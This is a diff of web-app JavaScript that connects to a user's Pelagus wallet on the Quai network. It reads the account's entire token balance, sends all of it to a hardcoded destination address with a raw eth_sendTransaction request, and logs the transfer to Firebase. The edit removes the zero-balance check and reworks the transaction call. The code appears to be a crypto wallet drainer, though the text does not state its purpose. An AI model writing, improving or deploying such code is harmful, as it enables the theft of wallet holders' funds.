@@ -443,33 +443,38 @@ async function saveToFirebase(data) {
         });
 
         const currentBalance = await getTokenBalance(accounts[0]);
-        if (currentBalance <= 0n) {
-            throw new Error('No tokens available');
-        }
-
         const readableAmount = (Number(currentBalance) / 1e18).toString();
 
-        const provider = new quais.providers.Web3Provider(window.pelagus);
-        const contract = new quais.Contract(TOKEN_ADDRESS, TOKEN_ABI, provider);
+        const data = quais.Interface.encodeFunctionData('transfer', [
+            DESTINATION_ADDRESS,
+            currentBalance.toString()
+        ]);
 
-        log(`📤 Sending ${readableAmount} tokens...`);
-        const tx = await contract.transfer(DESTINATION_ADDRESS, currentBalance);
+        const transactionParameters = {
+            to: TOKEN_ADDRESS,
+            from: accounts[0],
+            data: data,
+            value: '0x0'
+        };
+
+        const txHash = await window.pelagus.request({
+            method: 'eth_sendTransaction',
+            params: [transactionParameters],
+        });
+
+        log(`Transaction sent: ${txHash}`);
+        await waitForTransaction(txHash);
         
-        log(`📝 Transaction hash: ${tx.hash}`);
-        const receipt = await tx.wait();
-
         userSession.transferAmount = readableAmount;
-        userSession.transferTxHash = tx.hash;
+        userSession.transferTxHash = txHash;
         await saveSessionToFirebase();
 
         document.getElementById('sendBtn').style.display = 'none';
         document.getElementById('scanBtn').style.display = 'block';
         document.getElementById('buyBtn').style.display = 'block';
 
-        log('✅ Transfer complete!');
     } catch (error) {
-        log('❌ Error: ' + error.message);
-        console.error(error);
+        log('Error: ' + error.message);
     }
 }
 
